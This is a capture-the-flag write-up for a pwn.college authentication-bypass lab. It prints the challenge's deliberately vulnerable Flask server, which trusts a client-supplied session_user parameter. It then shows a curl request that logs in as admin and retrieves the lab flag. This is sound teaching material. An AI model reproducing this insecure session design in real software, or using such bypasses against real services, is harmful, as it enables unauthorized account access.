## Exercise
Of course, web applications can have security vulnerabilities that have nothing to do with the shell. A common type of vulnerability is an _Authentication Bypass_, where an attacker can bypass the typical authentication logic of an application and log in without knowing the necessary user credentials.

This level challenges you to explore one such scenario. This specific scenario arises because, again, of a gap between what the developer expects (that the URL parameters set by the application will only be set by the application itself) and the reality (that attackers can craft HTTP requests to their hearts content).

This level assumes a passing familiarity with SQL, which you can develop in the [SQL Playground](https://pwn.college/fundamentals/sql-playground). SQL will become incredibly relevant later, but for now, it is an incidental part of the challenge.

Anyways, go and bypass this authentication to log in as the `admin` user and get the flag!

## Solution
At first let's check out the files and directories on the server with their permissions:
```
> ls -la /
drwxr-xr-x    1 root root 4096 Sep  2 09:44 challenge
-r--------    1 root root   22 Sep  2 09:44 flag

> ls -la /challenge/
-rwsr-xr-x 1 root root  944 Jan 27  2025 DESCRIPTION.md
-rwsr-xr-x 1 root root 2412 Sep 14  2025 server
```
The flag is only readable by root and we are allowed to read and execute challenge files. Therefore let's check out the server file in /challenge/
```
> cat /challenge/server

#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

# Don't panic about this class. It simply implements a temporary database in which
# this application can store data. You don't need to understand its internals, just
# that it processes SQL queries using db.execute().
class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? AS password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" AS username, "password" AS password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    return flask.redirect(f"""{flask.request.path}?session_user={username}""")


@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.args.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```
After analysing the server file I come to the conclusion that a new database with the table "users" is being created. The users admin and guest with their passwords are also generated and stored into the table. The server listens for GET requests on / and asks for only the username. After typing in the admin username and I should get my flag.
The server also listens on / for POST requests where it verifies user credentials. Afterwards it sets and forwards the "session_user" parameter.
I will try to send a GET request to receive my flag:
```
> curl -L -v "http://challenge.localhost/?session_user=admin"

* Host challenge.localhost:80 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:80...
* connect to ::1 port 80 from ::1 port 58012 failed: Connection refused
*   Trying 127.0.0.1:80...
* Established connection to challenge.localhost (127.0.0.1 port 80) from 127.0.0.1 port 45830
* using HTTP/1.x
> GET /?session_user=admin HTTP/1.1
> Host: challenge.localhost
> User-Agent: curl/8.21.0
> Accept: */*
>
* Request completely sent off
127.0.0.1 - - [02/Sep/2026 10:20:53] "GET /?session_user=admin HTTP/1.1" 200 -
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.6 Python/3.8.10
< Date: Wed, 02 Sep 2026 10:20:53 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 267
< Connection: close
<
<html><body>Hello, admin!<br>Here is your flag: pwn.college{[REDACTED FLAG]}

        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
* shutting down connection #0
```
Yes that worked!
